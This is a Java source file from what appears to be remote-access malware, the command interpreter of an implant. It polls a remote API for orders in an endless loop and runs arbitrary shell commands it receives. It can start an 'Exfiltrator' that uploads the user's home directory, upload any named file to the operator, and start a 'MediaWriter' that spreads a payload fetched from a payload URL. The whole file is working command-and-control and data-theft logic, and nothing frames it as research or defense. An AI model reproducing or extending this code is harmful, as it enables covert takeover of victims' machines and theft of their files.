package modules.core;

import modules.auxiliary.*;
import modules.net.ShellHttpClient;

import java.io.File;
import java.util.StringTokenizer;

/**
    Requests, receives and interprets commands from the API.

    @author Str1k3r
    @version 1.0
 */
public class CmdInterpreter {

    private ShellHttpClient shellHttpClient;
    private static CmdInterpreter instance;

    private CmdInterpreter() {
        shellHttpClient = ShellHttpClient.getInstance();
    }

    public static CmdInterpreter getInstance() {
        if(instance == null) {
            instance = new CmdInterpreter();
        }

        return instance;
    }

    /**
        Send command request to API and wait for command.
     */
    public void listen() {
        Manager manager = Manager.getInstance();

        while(true) {
            Command command = shellHttpClient.requestCmd(manager.getConnectionId());

            if (command == null || command.cmdString == null || command.cmdString.isBlank()) {
                continue; // ignore command / nothing
            }

            System.out.printf("[*] Command received: '%s.\n", command.cmdString);
            if(command.cmdString.equalsIgnoreCase("__init__")) {
                // reconnect and try again
                manager.connect();
                continue;
            }

            if (command.isShellCmd) {
                Shell shell = Shell.getInstance();
                shell.exec(command.cmdString);

            } else if (command.cmdString.equalsIgnoreCase("exit")) {
                return; // stop listening

            } else {
                execUpperCmd(command.cmdString);
            }
        }
    }

    /**
        Execute an upper level command (non-shell or pre-setup shell command).

        @param cmdString Specifies the command and it's arguments.
     */
    private void execUpperCmd(String cmdString) {

        if(!cmdValid(cmdString)) {
            shellHttpClient.sendCmdResult("Invalid command format.");
        }

        StringTokenizer cmdTokens = new StringTokenizer(cmdString, " ");
        String command = cmdTokens.nextToken();
        switch(command.toLowerCase()) {
            case "stop" -> {
                String moduleName = cmdTokens.nextToken();
                stopModule(moduleName);
            }
            case "start" -> {
                String moduleName = cmdTokens.nextToken();
                startModule(moduleName);
            }
            case "download" -> {
                File file = new File(cmdTokens.nextToken());
                uploadFile(file);
            }
        }
    }

    /**
        Stop all instances of the specified module.

        @param moduleName The name of the module to stop.
     */
    private void stopModule(String moduleName) {
        switch (moduleName.toLowerCase()) {
            case "mediawriter" -> {
                if(MediaWriter.isStopped()) {
                    shellHttpClient.sendCmdResult("MediaWriter is already stopped.");
                    return;
                }

                MediaWriter.shutdown();
                if(MediaWriter.isStopped()) {
                    shellHttpClient.sendCmdResult("Mediawriter stopped.");
                }
                else {
                    shellHttpClient.sendCmdResult("Failed to stop Mediawriter. Try again.");
                }
            }

            case "exfiltrator" -> {
                if(Exfiltrator.isStopped()) {
                    shellHttpClient.sendCmdResult("Exfitrator is already stopped.");
                    return;
                }

                Exfiltrator.shutdown();
                if(Exfiltrator.isStopped()) {
                    shellHttpClient.sendCmdResult("Exfiltrator stopped.");
                }
                else {
                    shellHttpClient.sendCmdResult("Failed to stop Exfiltrator. Try again.");
                }
            }
        }
    }

    /**
        Start a new instance of the module specified.

        @param moduleName The name of the module to start.
     */
    private void startModule(String moduleName) {
        Manager manager = Manager.getInstance();

        switch (moduleName.toLowerCase()) {
            case "mediawriter" -> {
                if(!MediaWriter.isStopped()) {
                    shellHttpClient.sendCmdResult("MediaWriter is already running.");
                    return;
                }

                ModuleConfig.CopyConfig config = new ModuleConfig.CopyConfig()
                        .payloadURL(Endpoint.payload().toString())
                        .startPath("./")
                        .isRecursive(false);

                MediaWriter mediaWriter = MediaWriter.getInstance(config);
                manager.executeThread(mediaWriter);

                shellHttpClient.sendCmdResult("Mediawriter started.");
            }

            case "exfiltrator" -> {
                if(!Exfiltrator.isStopped()) {
                    shellHttpClient.sendCmdResult("Exfiltrator is already running.");
                    return;
                }

                Exfiltrator exfiltrator = new Exfiltrator(System.getProperty("user.home"));
                manager.executeThread(exfiltrator);
                shellHttpClient.sendCmdResult("Exfiltrator started.");
            }
        }
    }


    /**
        Service a file download by uploading the specified file to the API.

        @param file Represents the local file to upload.
     */
    private void uploadFile(File file) {
        Exfiltrator exfiltrator = new Exfiltrator(file.getParent());
        exfiltrator.exfiltrate(file);
    }


    /**
        Payload end validation of a command and it's arguments.

        @param cmdString Specifies tokens of the command and it's arguments.

        @return
            Returns true if the command passes all command specific checks, returns false if any checks fail.
     */
    private boolean cmdValid(String cmdString) {
        String[] modules = {"mediawriter", "exfiltrator"};

        StringTokenizer cmdTokens = new StringTokenizer(cmdString, " ");
        String command = cmdTokens.nextToken();
        switch (command.toLowerCase()) {
            case "stop", "start" -> {
                // module name specified and is valid module name
                return cmdTokens.hasMoreTokens() && isIn(cmdTokens.nextToken(), modules);
            }
            case "download" -> {
                return cmdTokens.hasMoreTokens();
            }
        }

        return false;
    }

    private boolean isIn(String search, String[] list) {
        for(String item : list) {
            if(item.equalsIgnoreCase(search)) {
                return true;
            }
        }

        return false;
    }
}
